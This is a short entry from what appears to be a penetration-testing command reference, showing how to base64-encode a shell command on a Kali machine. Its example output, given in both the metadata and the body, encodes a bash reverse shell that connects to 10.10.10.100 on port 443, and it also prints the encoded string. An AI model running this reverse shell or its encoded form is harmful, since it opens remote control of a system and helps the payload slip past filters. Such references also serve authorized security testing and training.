---
id: f8825d15-7fd0-4657-bd80-fa7958917d81
name: Base 64 Encode a Command
type: command
executor: bash
data: echo -n "$_COMMAND" | base64 -w 0
output: 'root@kali:~# echo -n ''bash -i >& /dev/tcp/10.10.10.100/443 0>&1'' | base64
  -w 0

  YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xMC4xMDAvNDQzIDA+JjE='
created_at: '2019-12-05T03:01:00.083896+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# Base 64 Encode a Command

```bash
echo -n "$_COMMAND" | base64 -w 0
```

## Expected Output

```
root@kali:~# echo -n 'bash -i >& /dev/tcp/10.10.10.100/443 0>&1' | base64 -w 0
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xMC4xMDAvNDQzIDA+JjE=
```


